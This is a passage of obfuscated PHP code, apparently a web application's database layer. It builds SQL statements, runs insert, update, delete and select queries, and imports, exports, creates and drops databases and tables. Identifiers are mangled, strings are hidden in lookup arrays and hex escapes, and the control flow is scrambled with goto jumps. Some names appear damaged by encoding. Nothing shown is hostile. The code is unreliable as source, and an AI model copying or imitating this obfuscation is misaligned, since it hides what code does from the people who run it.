$EÉ‹“´ŒÚõ .= $B»ô†»ÂÆ[944] . $C‡ªâô£ª±; } } } else { $EÉ‹“´ŒÚõ .= $B»ô†»ÂÆ[944] . $C‰ÂÚŒäÌ•; } } $EÉ‹“´ŒÚõ = preg_replace($B»ô†»ÂÆ[945], think_config($B»ô†»ÂÆ[848]) . $B»ô†»ÂÆ[946], $EÉ‹“´ŒÚõ); return $EÉ‹“´ŒÚõ; } protected function parseOrder($A÷è„Œ¨Ş¬) { $CéğåÛšÙ® =& $_SERVER[¶ªÕß‚ØÁŸ]; if (is_array($A÷è„Œ¨Ş¬)) { $fœé—æ±…‡ = array(); foreach ($A÷è„Œ¨Ş¬ as $A•Ò¼ÂŠŸï => $d¸¦œ¤å„‰) { if (is_numeric($A•Ò¼ÂŠŸï)) { $fœé—æ±…‡[] = $this->parseKey($d¸¦œ¤å„‰); } else { $d¸¦œ¤å„‰ = in_array(strtoupper(trim($d¸¦œ¤å„‰)), array($CéğåÛšÙ®[947], $CéğåÛšÙ®[948])) ? $CéğåÛšÙ®[50] . $d¸¦œ¤å„‰ : $CéğåÛšÙ®[33]; if (preg_match($CéğåÛšÙ®[949], $A•Ò¼ÂŠŸï)) { $fœé—æ±…‡[] = $this->parseKey($A•Ò¼ÂŠŸï) . $d¸¦œ¤å„‰; } else { think_exception($CéğåÛšÙ®[950] . $A•Ò¼ÂŠŸï); } } } $A÷è„Œ¨Ş¬ = implode($CéğåÛšÙ®[47], $fœé—æ±…‡); } return !empty($A÷è„Œ¨Ş¬) ? $CéğåÛšÙ®[951] . $A÷è„Œ¨Ş¬ : $CéğåÛšÙ®[33]; } protected function parseGroup($FÍ³È‰Ùã») { $D¶Ïïƒñ¶ =& $_SERVER[¶ªÕß‚ØÁŸ]; return !empty($FÍ³È‰Ùã») ? $D¶Ïïƒñ¶[952] . $FÍ³È‰Ùã» : $D¶Ïïƒñ¶[33]; } protected function parseHaving($dº¥¾é†Øƒ) { $cöÚïÇ¢Ô =& $_SERVER[¶ªÕß‚ØÁŸ]; return !empty($dº¥¾é†Øƒ) ? $cöÚïÇ¢Ô[953] . $dº¥¾é†Øƒ : $cöÚïÇ¢Ô[33]; } protected function parseComment($BÇö´’ï¹) { $DŠ¥ŒÖ‚â =& $_SERVER[¶ªÕß‚ØÁŸ]; return !empty($BÇö´’ï¹) ? $DŠ¥ŒÖ‚â[954] . $BÇö´’ï¹ . $DŠ¥ŒÖ‚â[955] : $DŠ¥ŒÖ‚â[33]; } protected function parseDistinct($B—åèš“º) { $b¸Å‘¢Çò =& $_SERVER[¶ªÕß‚ØÁŸ]; return !empty($B—åèš“º) ? $b¸Å‘¢Çò[956] : $b¸Å‘¢Çò[33]; } protected function parseUnion($FØ•Ö›èƒŸ) { $a¥’ÔÌää =& $_SERVER[¶ªÕß‚ØÁŸ]; if (empty($FØ•Ö›èƒŸ)) { return $a¥’ÔÌää[33]; } if (isset($FØ•Ö›èƒŸ[$a¥’ÔÌää[345]])) { $aöŸŞ´·µÉ = $a¥’ÔÌää[957]; unset($FØ•Ö›èƒŸ[$a¥’ÔÌää[345]]); } else { $aöŸŞ´·µÉ = $a¥’ÔÌää[958]; } foreach ($FØ•Ö›èƒŸ as $bÅ„Åøã¤†) { $d´Õ°ÃËª¨[] = $aöŸŞ´·µÉ . (is_array($bÅ„Åøã¤†) ? $this->buildSelectSql($bÅ„Åøã¤†) : $bÅ„Åøã¤†); } return implode($a¥’ÔÌää[50], $d´Õ°ÃËª¨); } public function insert($a‰”¶†¡‚, $b¤÷÷è²Ü¬ = array(), $A£Õ‰±ŠÎ = false) { goto bİ›’î×ó£; a•î¥Œ÷É: foreach ($a‰”¶†¡‚ as $d¯‹ÈöÅí => $D´„ˆòÖÄ›) { if (is_array($D´„ˆòÖÄ›) && $eïºá÷ÙØÙ[294] == $D´„ˆòÖÄ›[0]) { $f†·Î‚Æƒ¦[] = $this->parseKey($d¯‹ÈöÅí); $cù«ëõ•¢×[] = $D´„ˆòÖÄ›[1]; } elseif (is_scalar($D´„ˆòÖÄ›) || is_null($D´„ˆòÖÄ›)) { $f†·Î‚Æƒ¦[] = $this->parseKey($d¯‹ÈöÅí); $cù«ëõ•¢×[] = $this->parseValue($D´„ˆòÖÄ›); } } $C¶µò¼Š = ($A£Õ‰±ŠÎ ? $eïºá÷ÙØÙ[825] : $eïºá÷ÙØÙ[826]) . $eïºá÷ÙØÙ[827] . $this->parseTable($b¤÷÷è²Ü¬[$eïºá÷ÙØÙ[276]]) . $eïºá÷ÙØÙ[821] . implode($eïºá÷ÙØÙ[47], $f†·Î‚Æƒ¦) . $eïºá÷ÙØÙ[822] . implode($eïºá÷ÙØÙ[47], $cù«ëõ•¢×) . $eïºá÷ÙØÙ[823]; $C¶µò¼Š .= $this->parseLock(isset($b¤÷÷è²Ü¬[$eïºá÷ÙØÙ[784]]) ? $b¤÷÷è²Ü¬[$eïºá÷ÙØÙ[784]] : !1); goto BöÔ¿³®‰´; BöÔ¿³®‰´: $C¶µò¼Š .= $this->parseComment(!empty($b¤÷÷è²Ü¬[$eïºá÷ÙØÙ[350]]) ? $b¤÷÷è²Ü¬[$eïºá÷ÙØÙ[350]] : $eïºá÷ÙØÙ[33]); return $this->execute($C¶µò¼Š, $this->parseBind(!empty($b¤÷÷è²Ü¬[$eïºá÷ÙØÙ[282]]) ? $b¤÷÷è²Ü¬[$eïºá÷ÙØÙ[282]] : array())); goto E‰á†ã‚£¯; bİ›’î×ó£: $eïºá÷ÙØÙ =& $_SERVER[¶ªÕß‚ØÁŸ]; $cù«ëõ•¢× = $f†·Î‚Æƒ¦ = array(); $this->model = $b¤÷÷è²Ü¬[$eïºá÷ÙØÙ[278]]; goto a•î¥Œ÷É; E‰á†ã‚£¯: } public function selectInsert($F¬¼µšìõ—, $EÌ×Ò”…, $EÂ©Ş¹öë¤ = array()) { goto ašé‰ÓÁñ; eƒÄìä©: return $this->execute($dŸˆ°ÑøßÇ, $this->parseBind(!empty($EÂ©Ş¹öë¤[$FŠœÍš¤óœ[282]]) ? $EÂ©Ş¹öë¤[$FŠœÍš¤óœ[282]] : array())); goto eî—…Ã¿Â; ašé‰ÓÁñ: $FŠœÍš¤óœ =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->model = $EÂ©Ş¹öë¤[$FŠœÍš¤óœ[278]]; if (is_string($F¬¼µšìõ—)) { $F¬¼µšìõ— = explode($FŠœÍš¤óœ[47], $F¬¼µšìõ—); } goto EÊÃÄÑªì¶; EÊÃÄÑªì¶: array_walk($F¬¼µšìõ—, array($this, $FŠœÍš¤óœ[824])); $dŸˆ°ÑøßÇ = $FŠœÍš¤óœ[959] . $this->parseTable($EÌ×Ò”…) . $FŠœÍš¤óœ[821] . implode($FŠœÍš¤óœ[47], $F¬¼µšìõ—) . $FŠœÍš¤óœ[938]; $dŸˆ°ÑøßÇ .= $this->buildSelectSql($EÂ©Ş¹öë¤); goto eƒÄìä©; eî—…Ã¿Â: } public function update($dÕ´­ùèŒ, $aÛ¢£Ù«éç) { $f÷½ì§¶Ã£ =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->model = $aÛ¢£Ù«éç[$f÷½ì§¶Ã£[278]]; $CæÅŠˆ«¼Ô = $f÷½ì§¶Ã£[960] . $this->parseTable($aÛ¢£Ù«éç[$f÷½ì§¶Ã£[276]]) . $this->parseSet($dÕ´­ùèŒ) . $this->parseWhere(!empty($aÛ¢£Ù«éç[$f÷½ì§¶Ã£[272]]) ? $aÛ¢£Ù«éç[$f÷½ì§¶Ã£[272]] : $f÷½ì§¶Ã£[33]) . $this->parseOrder(!empty($aÛ¢£Ù«éç[$f÷½ì§¶Ã£[359]]) ? $aÛ¢£Ù«éç[$f÷½ì§¶Ã£[359]] : $f÷½ì§¶Ã£[33]) . $this->parseLimit(!empty($aÛ¢£Ù«éç[$f÷½ì§¶Ã£[289]]) ? $aÛ¢£Ù«éç[$f÷½ì§¶Ã£[289]] : $f÷½ì§¶Ã£[33]) . $this->parseLock(isset($aÛ¢£Ù«éç[$f÷½ì§¶Ã£[784]]) ? $aÛ¢£Ù«éç[$f÷½ì§¶Ã£[784]] : !1) . $this->parseComment(!empty($aÛ¢£Ù«éç[$f÷½ì§¶Ã£[350]]) ? $aÛ¢£Ù«éç[$f÷½ì§¶Ã£[350]] : $f÷½ì§¶Ã£[33]); return $this->execute($CæÅŠˆ«¼Ô, $this->parseBind(!empty($aÛ¢£Ù«éç[$f÷½ì§¶Ã£[282]]) ? $aÛ¢£Ù«éç[$f÷½ì§¶Ã£[282]] : array())); } public function delete($dõ¿¢Õá¼ç = array()) { $A’ŒÂ×™ =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->model = $dõ¿¢Õá¼ç[$A’ŒÂ×™[278]]; $fÀ¸æ»¢ªÉ = $A’ŒÂ×™[961] . $this->parseTable($dõ¿¢Õá¼ç[$A’ŒÂ×™[276]]) . $this->parseWhere(!empty($dõ¿¢Õá¼ç[$A’ŒÂ×™[272]]) ? $dõ¿¢Õá¼ç[$A’ŒÂ×™[272]] : $A’ŒÂ×™[33]) . $this->parseOrder(!empty($dõ¿¢Õá¼ç[$A’ŒÂ×™[359]]) ? $dõ¿¢Õá¼ç[$A’ŒÂ×™[359]] : $A’ŒÂ×™[33]) . $this->parseLimit(!empty($dõ¿¢Õá¼ç[$A’ŒÂ×™[289]]) ? $dõ¿¢Õá¼ç[$A’ŒÂ×™[289]] : $A’ŒÂ×™[33]) . $this->parseLock(isset($dõ¿¢Õá¼ç[$A’ŒÂ×™[784]]) ? $dõ¿¢Õá¼ç[$A’ŒÂ×™[784]] : !1) . $this->parseComment(!empty($dõ¿¢Õá¼ç[$A’ŒÂ×™[350]]) ? $dõ¿¢Õá¼ç[$A’ŒÂ×™[350]] : $A’ŒÂ×™[33]); return $this->execute($fÀ¸æ»¢ªÉ, $this->parseBind(!empty($dõ¿¢Õá¼ç[$A’ŒÂ×™[282]]) ? $dõ¿¢Õá¼ç[$A’ŒÂ×™[282]] : array())); } public function select($AØ†õß¿ˆó = array()) { goto DµÄÁ“ğç»; DµÄÁ“ğç»: $D¤í­ã±õ =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->model = $AØ†õß¿ˆó[$D¤í­ã±õ[278]]; $DÊŠ­·”Ç = $this->buildSelectSql($AØ†õß¿ˆó); goto c†‹Øõ•—Ì; c†‹Øõ•—Ì: $bØİÜÛ³ô˜ = isset($AØ†õß¿ˆó[$D¤í­ã±õ[346]]) ? $AØ†õß¿ˆó[$D¤í­ã±õ[346]] : !1; if ($bØİÜÛ³ô˜) { $c•†­ğİ†” = is_string($bØİÜÛ³ô˜[$D¤í­ã±õ[99]]) ? $bØİÜÛ³ô˜[$D¤í­ã±õ[99]] : $D¤í­ã±õ[962] . md5($DÊŠ­·”Ç); $dá¡´‘Õøï = think_cache($c•†­ğİ†”, $D¤í­ã±õ[33], $bØİÜÛ³ô˜); if (!1 !== $dá¡´‘Õøï) { return $dá¡´‘Õøï; } } $a¸œõ’çë÷ = $this->query($DÊŠ­·”Ç, $this->parseBind(!empty($AØ†õß¿ˆó[$D¤í­ã±õ[282]]) ? $AØ†õß¿ˆó[$D¤í­ã±õ[282]] : array())); goto FƒÖÂ™§»ù; FƒÖÂ™§»ù: if ($bØİÜÛ³ô˜ && !1 !== $a¸œõ’çë÷) { think_cache($c•†­ğİ†”, $a¸œõ’çë÷, $bØİÜÛ³ô˜); } return $a¸œõ’çë÷; goto CÀ±³Îñ–; CÀ±³Îñ–: } public function buildSelectSql($D×‹Üæà‘° = array()) { goto c¸õ‡êà‘£; c™‘‡èõ¥½: $Dê„ÏÓ“ˆĞ = $this->parseSql($this->selectSql, $D×‹Üæà‘°); $Dê„ÏÓ“ˆĞ .= $this->parseLock(isset($D×‹Üæà‘°[$A¨Ñœ”‹ÁÜ[784]]) ? $D×‹Üæà‘°[$A¨Ñœ”‹ÁÜ[784]] : !1); if (isset($AÚÑÍÜ¦âŞ)) { think_cache($AÚÑÍÜ¦âŞ, $Dê„ÏÓ“ˆĞ); } goto A”¦ã„İÉº; c¸õ‡êà‘£: $A¨Ñœ”‹ÁÜ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (isset($D×‹Üæà‘°[$A¨Ñœ”‹ÁÜ[349]])) { if (strpos($D×‹Üæà‘°[$A¨Ñœ”‹ÁÜ[349]], $A¨Ñœ”‹ÁÜ[47])) { list($C›—ÏØ¦—–, $AôÅ™Áø†Š) = explode($A¨Ñœ”‹ÁÜ[47], $D×‹Üæà‘°[$A¨Ñœ”‹ÁÜ[349]]); } else { $C›—ÏØ¦—– = $D×‹Üæà‘°[$A¨Ñœ”‹ÁÜ[349]]; } $C›—ÏØ¦—– = $C›—ÏØ¦—– ? $C›—ÏØ¦—– : 1; $AôÅ™Áø†Š = isset($AôÅ™Áø†Š) ? $AôÅ™Áø†Š : (is_numeric($D×‹Üæà‘°[$A¨Ñœ”‹ÁÜ[289]]) ? $D×‹Üæà‘°[$A¨Ñœ”‹ÁÜ[289]] : 20); $dç‡Ô¢›Ë³ = $AôÅ™Áø†Š * ((int) $C›—ÏØ¦—– - 1); $D×‹Üæà‘°[$A¨Ñœ”‹ÁÜ[289]] = $dç‡Ô¢›Ë³ . $A¨Ñœ”‹ÁÜ[47] . $AôÅ™Áø†Š; } if (think_config($A¨Ñœ”‹ÁÜ[963])) { $AÚÑÍÜ¦âŞ = $A¨Ñœ”‹ÁÜ[964] . md5(serialize($D×‹Üæà‘°)); $F›»‰ŒÆ³¿ = think_cache($AÚÑÍÜ¦âŞ); if ($F›»‰ŒÆ³¿) { return $F›»‰ŒÆ³¿; } } goto c™‘‡èõ¥½; A”¦ã„İÉº: return $Dê„ÏÓ“ˆĞ; goto D–Á˜§Šªš; D–Á˜§Šªš: } public function parseSql($f§ÂŞ¡ªˆ, $C¹âä…Ş¤Õ = array()) { $EÁâùÒƒÍÃ =& $_SERVER[¶ªÕß‚ØÁŸ]; $f§ÂŞ¡ªˆ = str_replace(array($EÁâùÒƒÍÃ[965], $EÁâùÒƒÍÃ[966], $EÁâùÒƒÍÃ[967], $EÁâùÒƒÍÃ[968], $EÁâùÒƒÍÃ[969], $EÁâùÒƒÍÃ[970], $EÁâùÒƒÍÃ[971], $EÁâùÒƒÍÃ[972], $EÁâùÒƒÍÃ[973], $EÁâùÒƒÍÃ[974], $EÁâùÒƒÍÃ[975]), array($this->parseTable("{$C¹âä…Ş¤Õ[$EÁâùÒƒÍÃ[276]]}"), $this->parseDistinct(isset($C¹âä…Ş¤Õ[$EÁâùÒƒÍÃ[976]]) ? $C¹âä…Ş¤Õ[$EÁâùÒƒÍÃ[976]] : !1), $this->parseField(!empty($C¹âä…Ş¤Õ[$EÁâùÒƒÍÃ[270]]) ? $C¹âä…Ş¤Õ[$EÁâùÒƒÍÃ[270]] : $EÁâùÒƒÍÃ[186]), $this->parseJoin(!empty($C¹âä…Ş¤Õ[$EÁâùÒƒÍÃ[279]]) ? $C¹âä…Ş¤Õ[$EÁâùÒƒÍÃ[279]] : $EÁâùÒƒÍÃ[33]), $this->parseWhere(!empty($C¹âä…Ş¤Õ[$EÁâùÒƒÍÃ[272]]) ? $C¹âä…Ş¤Õ[$EÁâùÒƒÍÃ[272]] : $EÁâùÒƒÍÃ[33]), $this->parseGroup(!empty($C¹âä…Ş¤Õ[$EÁâùÒƒÍÃ[977]]) ? $C¹âä…Ş¤Õ[$EÁâùÒƒÍÃ[977]] : $EÁâùÒƒÍÃ[33]), $this->parseHaving(!empty($C¹âä…Ş¤Õ[$EÁâùÒƒÍÃ[978]]) ? $C¹âä…Ş¤Õ[$EÁâùÒƒÍÃ[978]] : $EÁâùÒƒÍÃ[33]), $this->parseOrder(!empty($C¹âä…Ş¤Õ[$EÁâùÒƒÍÃ[359]]) ? $C¹âä…Ş¤Õ[$EÁâùÒƒÍÃ[359]] : $EÁâùÒƒÍÃ[33]), $this->parseLimit(!empty($C¹âä…Ş¤Õ[$EÁâùÒƒÍÃ[289]]) ? $C¹âä…Ş¤Õ[$EÁâùÒƒÍÃ[289]] : $EÁâùÒƒÍÃ[33]), $this->parseUnion(!empty($C¹âä…Ş¤Õ[$EÁâùÒƒÍÃ[344]]) ? $C¹âä…Ş¤Õ[$EÁâùÒƒÍÃ[344]] : $EÁâùÒƒÍÃ[33]), $this->parseComment(!empty($C¹âä…Ş¤Õ[$EÁâùÒƒÍÃ[350]]) ? $C¹âä…Ş¤Õ[$EÁâùÒƒÍÃ[350]] : $EÁâùÒƒÍÃ[33])), $f§ÂŞ¡ªˆ); return $f§ÂŞ¡ªˆ; } public function getLastSql($B¯ÉÕ‘ïçÎ = '') { return $B¯ÉÕ‘ïçÎ ? $this->modelSql[$B¯ÉÕ‘ïçÎ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($Aï¾––Ÿ™š) { return addslashes($Aï¾––Ÿ™š); } public function setModel($e…ïİã÷¸) { $this->model = $e…ïİã÷¸; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($Aã®ƒÊ‚­³, $DÛ‡–«Œ„Ô = '') { $this->database = $Aã®ƒÊ‚­³; $this->type = $DÛ‡–«Œ„Ô; } public function model($FÄ×“Å´¹£ = '') { return new ModelBase($FÄ×“Å´¹£, $_SERVER[¶ªÕß‚ØÁŸ][33], $this->database); } public function db($CØñÅîïÒ = false) { goto cƒĞ†âÊ˜Ä; cŒ¥§£šÈÏ: if (!$a˜””ùñ½) { $e’™â·‹Ş‹->execute("\143\x72\145\x61\x74\x65\x20\x64\141\x74\x61\142\x61\x73\145\x20\x60{$fÖ¤ß´‰è}\x60"); } $EŠ±Çö¶—³[$Eåùˆñ¶à¨[891]] = $fÖ¤ß´‰è; if ($EŠ±Çö¶—³[$Eåùˆñ¶à¨[736]] == $Eåùˆñ¶à¨[737]) { $EŠ±Çö¶—³[$Eåùˆñ¶à¨[738]] .= $Eåùˆñ¶à¨[979] . $fÖ¤ß´‰è; } goto C¸…Æ•˜Ï; C¸…Æ•˜Ï: $this->database = $EŠ±Çö¶—³; $e’™â·‹Ş‹->execute("\x75\163\x65\x20\x60{$fÖ¤ß´‰è}\x60"); return $e’™â·‹Ş‹; goto däˆ³ˆÙ; cƒĞ†âÊ˜Ä: $Eåùˆñ¶à¨ =& $_SERVER[¶ªÕß‚ØÁŸ]; $EŠ±Çö¶—³ = array_change_key_case($this->database); if ($this->type == $Eåùˆñ¶à¨[9] || !$CØñÅîïÒ) { return $this->model()->db(); } goto FèÅ¸÷ëØç; DæÔ·ğ¨©Ğ: $this->database = $EŠ±Çö¶—³; $e’™â·‹Ş‹ = $this->model()->db(); try { $a˜””ùñ½ = $e’™â·‹Ş‹->execute("\163\150\157\x77\40\144\141\164\x61\x62\141\163\x65\x73\40\x6c\x69\153\145\x20\47{$fÖ¤ß´‰è}\x27"); } catch (Exception $fİøèÃ¾¬) { } goto cŒ¥§£šÈÏ; FèÅ¸÷ëØç: $fÖ¤ß´‰è = $EŠ±Çö¶—³[$Eåùˆñ¶à¨[891]]; $EŠ±Çö¶—³[$Eåùˆñ¶à¨[891]] = $Eåùˆñ¶à¨[33]; if ($EŠ±Çö¶—³[$Eåùˆñ¶à¨[736]] == $Eåùˆñ¶à¨[737]) { $AÁŒæ„¬•Ş = $EŠ±Çö¶—³[$Eåùˆñ¶à¨[738]]; $EŠ±Çö¶—³[$Eåùˆñ¶à¨[738]] = substr($AÁŒæ„¬•Ş, 0, strrpos($AÁŒæ„¬•Ş, $Eåùˆñ¶à¨[979])); } goto DæÔ·ğ¨©Ğ; däˆ³ˆÙ: } public function createTable($e‰½Ò£¸£Ö, $cèÌÛàíõ© = null) { $D¤Ÿ§¤Öä¦ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!IO::exist($e‰½Ò£¸£Ö)) { show_json(LNG($D¤Ÿ§¤Öä¦[980]), !1); } $f‘¿øåÆ = sqlSplit(IO::getContent($e‰½Ò£¸£Ö)); foreach ($f‘¿øåÆ as $c±ù¼¢ì´¸) { if ($cèÌÛàíõ©) { $dµÖƒ¤òé§ = stripos($c±ù¼¢ì´¸, $D¤Ÿ§¤Öä¦[981]) === 0; if ($dµÖƒ¤òé§) { $cèÌÛàíõ©->task[$D¤Ÿ§¤Öä¦[982]] += 1; } } $this->model()->db()->execute($c±ù¼¢ì´¸); if ($cèÌÛàíõ© && $dµÖƒ¤òé§) { preg_match($D¤Ÿ§¤Öä¦[983], $c±ù¼¢ì´¸, $BÛ¯ç–²Ì©); $cèÌÛàíõ©->task[$D¤Ÿ§¤Öä¦[984]] = $BÛ¯ç–²Ì©[1]; $cèÌÛàíõ©->update(1); } } $this->taskToCache($cèÌÛàíõ©); } public function insertTable($A¹‚Ô†×Õä, $dŒ‹ğõ…¼ = null) { $BåÎâ¾ùÑÇ =& $_SERVER[¶ªÕß‚ØÁŸ]; $F°Ÿ¨½²Ãî = $this->model()->db(); $a¿“ó”×Á¸ = $aŞ¿ÖŞ³Æ¸ ? array($aŞ¿ÖŞ³Æ¸) : $F°Ÿ¨½²Ãî->getTables(); foreach ($A¹‚Ô†×Õä as $c×ç¬·´×‰) { $aŞ¿ÖŞ³Æ¸ = basename($c×ç¬·´×‰, $BåÎâ¾ùÑÇ[731]); if (!in_array($aŞ¿ÖŞ³Æ¸, $a¿“ó”×Á¸)) { continue; } if ($dŒ‹ğõ…¼) { $dŒ‹ğõ…¼->task[$BåÎâ¾ùÑÇ[984]] = $aŞ¿ÖŞ³Æ¸; } if (get_filesize($c×ç¬·´×‰) == 0) { continue; } $dÎÎ”šÒğ˜ = $this->sqlToDb($c×ç¬·´×‰, $dŒ‹ğõ…¼); if (!$dÎÎ”šÒğ˜) { show_json(LNG($BåÎâ¾ùÑÇ[985]) . "\133{$aŞ¿ÖŞ³Æ¸}\x5d", !1); } } $this->taskToCache($dŒ‹ğõ…¼); } public function sqlFromDb($dÙ‹¯• ò‚, $bİŸ¬ù¶Î, $D³ÎŸŸğÈ² = null, $B¾æÍ¯Ì› = null) { goto BÍ»ÙÑÌŞÑ; Aî›Í‹·Ò¨: fclose($EÕÑÊÄ Ó³); return $Cç•²ÂÁ³; goto B²­†ÁÉ; BÍ»ÙÑÌŞÑ: if ($D³ÎŸŸğÈ²) { $D³ÎŸŸğÈ²->task[$_SERVER[¶ªÕß‚ØÁŸ][984]] = $dÙ‹¯• ò‚; } $B¦÷ÔĞÏùœ = $this->model($dÙ‹¯• ò‚); $Cç•²ÂÁ³ = 0; goto B·™êËÑëÑ; Cê‡‘áÈá¤: $A¹Å¥†®™» = $B¦÷ÔĞÏùœ->getPk(); $Cø¯¶î‰„± = $B¦÷ÔĞÏùœ->getDbFields(); do { $AÄğÄ¾Ù™ = $B¦÷ÔĞÏùœ->field($Cø¯¶î‰„±)->order($A¹Å¥†®™» . $_SERVER[¶ªÕß‚ØÁŸ][987])->selectPage($d—åÚĞ ¢ñ, $dáÑ»´Ï¼); $aìÓßİ¨‡ = !empty($AÄğÄ¾Ù™[$_SERVER[¶ªÕß‚ØÁŸ][363]]) ? $AÄğÄ¾Ù™[$_SERVER[¶ªÕß‚ØÁŸ][363]] : array(); if (!($C¥«…öŠ“¼ = count($aìÓßİ¨‡))) { break; } $D—·¾‚Øµ† = array(); foreach ($aìÓßİ¨‡ as $Dæâä½ã¶) { if ($B¾æÍ¯Ì›) { $Dæâä½ã¶[$_SERVER[¶ªÕß‚ØÁŸ][85]] = "\x7b\x69\x6f\72{$B¾æÍ¯Ì›}\175" . substr($Dæâä½ã¶[$_SERVER[¶ªÕß‚ØÁŸ][85]], strlen("\x7b\151\x6f\72{$Dæâä½ã¶[$_SERVER[¶ªÕß‚ØÁŸ][757]]}\175")); $Dæâä½ã¶[$_SERVER[¶ªÕß‚ØÁŸ][757]] = $B¾æÍ¯Ì›; } $D—·¾‚Øµ†[] = $_SERVER[¶ªÕß‚ØÁŸ][988] . $this->sqlEncode($Dæâä½ã¶) . $_SERVER[¶ªÕß‚ØÁŸ][989]; } $B•Š—£Õ = "\x49\116\123\105\122\124\x20\x49\116\124\117\40\140{$dÙ‹¯• ò‚}\x60\x20\50\x60" . implode($_SERVER[¶ªÕß‚ØÁŸ][990], $Cø¯¶î‰„±) . $_SERVER[¶ªÕß‚ØÁŸ][991]; fwrite($EÕÑÊÄ Ó³, $B•Š—£Õ . implode($_SERVER[¶ªÕß‚ØÁŸ][992], $D—·¾‚Øµ†) . $_SERVER[¶ªÕß‚ØÁŸ][77] . PHP_EOL); $dáÑ»´Ï¼++; $Cç•²ÂÁ³ += $C¥«…öŠ“¼; if ($D³ÎŸŸğÈ²) { $D³ÎŸŸğÈ²->update($C¥«…öŠ“¼); } } while ($C¥«…öŠ“¼ == $d—åÚĞ ¢ñ); goto Aî›Í‹·Ò¨; B·™êËÑëÑ: $dáÑ»´Ï¼ = 1; $d—åÚĞ ¢ñ = 500; $EÕÑÊÄ Ó³ = fopen($bİŸ¬ù¶Î, $_SERVER[¶ªÕß‚ØÁŸ][986]); goto Cê‡‘áÈá¤; B²­†ÁÉ: } public function sqlToDb($c¾â—¿˜Ä…, $fíî¨‘‘„Î = null) { goto a‡¨ßÂÊÕƒ; bÈƒÕ©¿Øò: $aàğù“…º– = 500 + 1; while (!feof($Bí¬êê»µø)) { if ($fíî¨‘‘„Î && $Fç‚íìÖÑ« != 0) { $fíî¨‘‘„Î->task[$d²Ô‹’ÒñÅ[982]] += 1; } $Fç‚íìÖÑ«++; $ašÓ•‰õ¢ = trim(fgets($Bí¬êê»µø)); $cİ…´´ÉËé .= $d²Ô‹’ÒñÅ[50] . $this->sqlDecode($ašÓ•‰õ¢, $this->type); if ($Fç‚íìÖÑ« == $aàğù“…º–) { $cİ…´´ÉËé = rtrim(trim($cİ…´´ÉËé), $d²Ô‹’ÒñÅ[77]); if (!$bó“Øã¾‘->execute($cİ…´´ÉËé)) { return !1; } if ($fíî¨‘‘„Î) { $fíî¨‘‘„Î->update($Fç‚íìÖÑ« - 1); } $cİ…´´ÉËé = $d²Ô‹’ÒñÅ[33]; $Fç‚íìÖÑ« = 0; } } fclose($Bí¬êê»µø); goto cµÈØªã–Õ; cµÈØªã–Õ: if ($cİ…´´ÉËé) { $cİ…´´ÉËé = rtrim(trim($cİ…´´ÉËé), $d²Ô‹’ÒñÅ[77]); if (!$bó“Øã¾‘->execute($cİ…´´ÉËé)) { return !1; } if ($fíî¨‘‘„Î) { $fíî¨‘‘„Î->update($Fç‚íìÖÑ« - 1); } } return !0; goto f™ŒÔÖŠÅì; e‡ÓÜÁ“‰Œ: if (!$Bí¬êê»µø) { return !1; } $Fç‚íìÖÑ« = 0; $cİ…´´ÉËé = $d²Ô‹’ÒñÅ[33]; goto bÈƒÕ©¿Øò; a‡¨ßÂÊÕƒ: $d²Ô‹’ÒñÅ =& $_SERVER[¶ªÕß‚ØÁŸ]; $bó“Øã¾‘ = $this->model()->db(); $Bí¬êê»µø = @fopen($c¾â—¿˜Ä…, $d²Ô‹’ÒñÅ[993]); goto e‡ÓÜÁ“‰Œ; f™ŒÔÖŠÅì: } public function dropTable($bÂÕ‡×‡°Î = null) { $d”âÕ®ÕÛ = $this->model()->db(); $a¨«–¿èƒ = $bÂÕ‡×‡°Î ? array($bÂÕ‡×‡°Î) : $d”âÕ®ÕÛ->getTables(); if (!$a¨«–¿èƒ) { return; } foreach ($a¨«–¿èƒ as $bÂÕ‡×‡°Î) { $d”âÕ®ÕÛ->execute("\x64\x72\x6f\x70\40\x74\x61\x62\x6c\x65\x20\151\146\x20\x65\170\x69\x73\164\163\40\140{$bÂÕ‡×‡°Î}\140"); } } private function taskToCache($Aãî×ºÖ´ = null) { $B×Ú”İ„ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$Aãî×ºÖ´) { return; } $FâæõîÚ‡° = array($B×Ú”İ„[984] => $Aãî×ºÖ´->task[$B×Ú”İ„[984]], $B×Ú”İ„[982] => $Aãî×ºÖ´->task[$B×Ú”İ„[982]], $B×Ú”İ„[994] => $Aãî×ºÖ´->task[$B×Ú”İ„[994]]); if ($FâæõîÚ‡°[$B×Ú”İ„[982]] == $FâæõîÚ‡°[$B×Ú”İ„[994]]) { $FâæõîÚ‡°[$B×Ú”İ„[709]] = 1; } Cache::set($B×Ú”İ„[995] . $Aãî×ºÖ´->task[$B×Ú”İ„[375]], $FâæõîÚ‡°); $Aãî×ºÖ´->end(); } private function sqlEncode($aÁÃ©Œ’†¾) { $a¼ÚÅøçÆ =& $_SERVER[¶ªÕß‚ØÁŸ]; $A¨ÈÒ²˜ùá = array(); foreach ($aÁÃ©Œ’†¾ as $Dñ•‹»Éø) { if (is_array($Dñ•‹»Éø)) { $Dñ•‹»Éø = json_encode_force($Dñ•‹»Éø); } $Dñ•‹»Éø = addslashes($Dñ•‹»Éø); $Dñ•‹»Éø = str_replace(array($a¼ÚÅøçÆ[996], $a¼ÚÅøçÆ[62]), array($a¼ÚÅøçÆ[997], $a¼ÚÅøçÆ[998]), $Dñ•‹»Éø); $A¨ÈÒ²˜ùá[] = str_replace($a¼ÚÅøçÆ[55], $a¼ÚÅøçÆ[999], $Dñ•‹»Éø); } return $a¼ÚÅøçÆ[55] . implode($a¼ÚÅøçÆ[1000], $A¨ÈÒ²˜ùá) . $a¼ÚÅøçÆ[55]; } private function sqlDecode($d›ÍÒØ¿„ , $bÍ¬Ú²ßµ) { $dàéãĞÎÜé =& $_SERVER[¶ªÕß‚ØÁŸ]; $d›ÍÒØ¿„  = str_replace(array($dàéãĞÎÜé[997], $dàéãĞÎÜé[998]), array($dàéãĞÎÜé[996], $dàéãĞÎÜé[62]), 